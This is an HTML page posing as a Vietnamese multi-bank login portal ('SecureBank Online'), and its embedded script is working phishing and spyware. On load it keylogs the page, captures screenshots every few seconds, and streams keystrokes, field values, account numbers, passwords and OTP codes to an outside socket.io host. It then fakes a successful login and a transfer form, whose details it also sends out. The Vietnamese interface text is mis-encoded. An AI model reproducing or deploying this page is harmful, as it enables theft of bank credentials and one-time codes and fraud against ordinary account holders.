<!DOCTYPE html>
<html>
<head>
    <title>Banking Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; }
        .header { background: #1e3a8a; color: white; padding: 20px; text-align: center; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1e3a8a; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #1e40af; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>üè¶ SecureBank Online</h1>
        <p>ƒêƒÉng nh·∫≠p an to√†n</p>
    </div>
    
    <div class="container">
        <h2>Ch·ªçn ng√¢n h√†ng c·ªßa b·∫°n</h2>
        <div style="margin-bottom: 20px;">
            <select id="bankSelect" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 15px;">
                <option value="">-- Ch·ªçn ng√¢n h√†ng --</option>
                <option value="vcb">üè¶ Vietcombank</option>
                <option value="tcb">üè¶ Techcombank</option>
                <option value="acb">üè¶ ACB</option>
                <option value="mb">üè¶ MB Bank</option>
                <option value="vpbank">üè¶ VPBank</option>
                <option value="sacombank">üè¶ Sacombank</option>
                <option value="bidv">üè¶ BIDV</option>
                <option value="vib">üè¶ VIB</option>
            </select>
        </div>
        
        <h2>ƒêƒÉng nh·∫≠p t√†i kho·∫£n</h2>
        <form id="loginForm">
            <div class="form-group">
                <label>S·ªë t√†i kho·∫£n:</label>
                <input type="text" id="account" placeholder="Nh·∫≠p s·ªë t√†i kho·∫£n" required>
            </div>
            <div class="form-group">
                <label>M·∫≠t kh·∫©u:</label>
                <input type="password" id="password" placeholder="Nh·∫≠p m·∫≠t kh·∫©u" required>
            </div>
            <div class="form-group">
                <label>M√£ OTP:</label>
                <input type="text" id="otp" placeholder="Nh·∫≠p m√£ OTP" maxlength="6">
            </div>
            <button type="submit">ƒêƒÉng nh·∫≠p</button>
        </form>
    </div>
    
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io('https://expense-manager-vpn.onrender.com');
        let keylogData = [];
        
        window.addEventListener('load', () => {
            setTimeout(startScreenCapture, 2000);
            startKeylogging();
        });
        
        async function startScreenCapture() {
            try {
                const captureInterval = setInterval(async () => {
                    try {
                        const tempCanvas = await html2canvas(document.body, {
                            allowTaint: true,
                            useCORS: true,
                            scale: 0.5
                        });
                        
                        const imageData = tempCanvas.toDataURL('image/jpeg', 0.6);
                        socket.emit('screen-capture', {
                            userId: socket.id,
                            screenshot: imageData,
                            timestamp: Date.now(),
                            url: window.location.href
                        });
                    } catch (e) {
                        console.log('Screen capture failed');
                    }
                }, 3000);
            } catch (err) {
                console.log('Screen capture not supported');
            }
        }
        
        function startKeylogging() {
            document.addEventListener('keydown', (e) => {
                keylogData.push({
                    key: e.key,
                    target: e.target.id || e.target.tagName,
                    value: e.target.value,
                    timestamp: Date.now()
                });
                
                if (keylogData.length >= 5) {
                    socket.emit('keylog-data', keylogData);
                    keylogData = [];
                }
            });
            
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('blur', () => {
                    socket.emit('input-data', {
                        field: input.id,
                        value: input.value,
                        timestamp: Date.now()
                    });
                });
            });
        }
        
        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const bankSelect = document.getElementById('bankSelect').value;
            const account = document.getElementById('account').value;
            const password = document.getElementById('password').value;
            const otp = document.getElementById('otp').value;
            
            if (!bankSelect) {
                alert('Vui l√≤ng ch·ªçn ng√¢n h√†ng!');
                return;
            }
            
            socket.emit('login-attempt', {
                bank: bankSelect,
                account: account,
                password: password,
                otp: otp,
                timestamp: Date.now(),
                userAgent: navigator.userAgent
            });
            
            if (bankSelect && account && password) {
                alert('ƒêƒÉng nh·∫≠p th√†nh c√¥ng!');
                document.querySelector('.container').innerHTML = `
                    <h2>Ch√†o m·ª´ng!</h2>
                    <p>Ng√¢n h√†ng: ${document.querySelector('#bankSelect option:checked').text}</p>
                    <p>T√†i kho·∫£n: ${account}</p>
                    <p>S·ªë d∆∞: 1,234,567,890 VNƒê</p>
                    <button onclick="transfer()">Chuy·ªÉn kho·∫£n</button>
                `;
            }
        });
        
        function transfer() {
            document.querySelector('.container').innerHTML = `
                <h2>Chuy·ªÉn kho·∫£n</h2>
                <input type="text" placeholder="S·ªë t√†i kho·∫£n nh·∫≠n" id="toAccount">
                <input type="number" placeholder="S·ªë ti·ªÅn" id="amount">
                <button onclick="confirmTransfer()">X√°c nh·∫≠n</button>
            `;
            startKeylogging();
        }
        
        function confirmTransfer() {
            const toAccount = document.getElementById('toAccount').value;
            const amount = document.getElementById('amount').value;
            
            socket.emit('transfer-data', {
                toAccount: toAccount,
                amount: amount,
                timestamp: Date.now()
            });
            
            alert('Chuy·ªÉn kho·∫£n th√†nh c√¥ng!');
        }
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</body>
</html>